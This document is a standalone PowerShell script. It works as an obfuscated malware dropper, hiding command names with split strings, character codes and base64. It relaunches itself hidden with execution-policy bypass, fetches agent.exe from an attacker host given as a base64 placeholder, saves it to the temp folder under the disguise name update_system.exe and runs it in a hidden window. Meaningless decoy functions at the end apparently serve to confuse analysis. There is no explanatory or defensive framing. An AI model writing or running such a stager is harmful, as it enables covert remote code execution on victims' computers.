$g1 = "Get-"; $g2 = "Proc"; $g3 = "ess"
$gc = $g1 + $g2 + $g3
$h = (& $gc -Id $PID).MainWindowHandle
if ($h -ne 0) {
    $s1 = "pow"; $s2 = "ersh"; $s3 = "ell"
    $w1 = "-Win"; $w2 = "dowSt"; $w3 = "yle Hi"; $w4 = "dden"
    $x1 = "-Exe"; $x2 = "cutionP"; $x3 = "olicy By"; $x4 = "pass"
    $f1 = "-Fi"; $f2 = "le"
    $args_str = ($w1+$w2+$w3+$w4) + " " + ($x1+$x2+$x3+$x4) + " " + ($f1+$f2) + " `"$PSCommandPath`""
    $sp1 = "St"; $sp2 = "art-"; $sp3 = "Pro"; $sp4 = "cess"
    & ($sp1+$sp2+$sp3+$sp4) ($s1+$s2+$s3) -ArgumentList $args_str -WindowStyle Hidden
    exit
}

$a = "Progr"; $b = "essPr"; $c = "efer"; $d = "ence"
Set-Variable -Name ($a + $b + $c + $d) -Value 'SilentlyContinue'

$i_b64 = "YOUR_IP_BASE64_HERE"
$s_ip = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($i_b64))

$p1 = "h"; $p2 = "tt"; $p3 = "p:"; $p4 = "//"
$f_u = "ah" + $p4 + $s_ip + "/agent.exe"
$r_u = $f_u.Replace("ah", ($p1 + $p2 + $p3))

$m_p = @('Request', 'Invoke-', 'Web')
$m_c = $m_p[1] + $m_p[2] + $m_p[0]

$e1 = "St"; $e2 = "art-"; $e3 = "Pro"; $e4 = "cess"
$exe_c = $e1 + $e2 + $e3 + $e4

$t_n = -join @([char]117,[char]112,[char]100,[char]97,[char]116,[char]101,[char]95,[char]115,[char]121,[char]115,[char]116,[char]101,[char]109,[char]46,[char]101,[char]120,[char]101)
$t_p = "$env:TEMP\$t_n"


$k1 = [char]0x2D + [char]0x55 + [char]0x72 + [char]0x69


$k2 = [char]0x2D + [char]0x4F + [char]0x75 + [char]0x74 + [char]0x46 + [char]0x69 + [char]0x6C + [char]0x65


$k3 = [char]0x2D + [char]0x46 + [char]0x69 + [char]0x6C + [char]0x65 + [char]0x50 + [char]0x61 + [char]0x74 + [char]0x68


$k4 = "-Win" + "dow" + "Sty" + "le"


$k5 = "Hi" + "dd" + "en"


$dl_args = @{ $k1 = $r_u; $k2 = $t_p }
& $m_c @dl_args

$ex_args = @{ $k3 = $t_p; $k4 = $k5 }
&  $exe_c  @ex_args


function Sync-Data { $v = 1..15 | % { $_ * 3 }; return $v }
function Get-XmLr { $qZ9 = "aB3"; $pL2 = $qZ9.Length * 42; return $pL2 }
function Set-NtR0 { $jK7 = @(1,3,7); $jK7 | ForEach-Object { $_ -bxor 0xFF } | Out-Null }
Sync-Data | Out-Null
Get-XmLr | Out-Null
Set-NtR0